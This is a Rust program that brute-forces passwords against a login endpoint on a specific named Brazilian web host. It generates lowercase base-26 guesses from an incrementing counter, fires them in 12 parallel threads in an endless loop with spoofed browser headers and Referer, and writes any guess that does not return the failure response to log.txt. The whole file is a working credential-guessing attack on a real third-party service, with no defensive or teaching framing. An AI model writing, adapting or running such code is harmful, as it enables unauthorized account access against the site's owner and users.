use std::error::Error;
use std::fs::OpenOptions;
use std::io::Write;
use std::sync::{Arc, Mutex};
use std::thread;
use reqwest::blocking::Client;

fn decimal_to_base26(num: u32) -> String {
    let mut base26 = String::new();
    let mut n = num;
    while n > 0 {
        let remainder = (n - 1) % 26;
        let c = char::from_u32(b'a' as u32 + remainder as u32).unwrap();
        base26.insert(0, c);
        n = (n - 1) / 26;
    }
    base26
}

fn make_request(i: u32, client: &Client, results: Arc<Mutex<Vec<String>>>) {
    let id = decimal_to_base26(i);
    let url = format!("http://plugpikb.plugprint.com.br:3345/logar?senha={}", id);
    let response = client
        .get(&url)
        .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0")
        .header("Accept", "application/json, text/plain, */*")
        .header("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
        .header("Referer", "http://plugpik.plugprint.com.br/")
        .send()
        .unwrap();
    let text = response.text().unwrap();
    if text == "{\"Logado\":false}" {
        results.lock().unwrap().push(format!("{}:{} falhou",i,id));
    }
    else{
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("log.txt")
            .unwrap();
        writeln!(file, "{}:{}", i, id).unwrap();
        results.lock().unwrap().push(format!("\n{}:{} foi",i,id));
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let results = Arc::new(Mutex::new(Vec::new()));
    let mut i = 274260;
    loop {
        let mut threads = Vec::new();
        for _ in 0..12 {
            i += 1;
            
            let client = client.clone();
            let results = results.clone();
            let t = thread::spawn(move || {
                make_request(i, &client, results);
                println!("{}:{}",i,decimal_to_base26(i))
            });
            threads.push(t);
        }
        for t in threads {
            t.join().unwrap();
        }
        let results = results.lock().unwrap();
        if results.len() > 0 {
            //println!("{:?}", results);
        }
    }
}
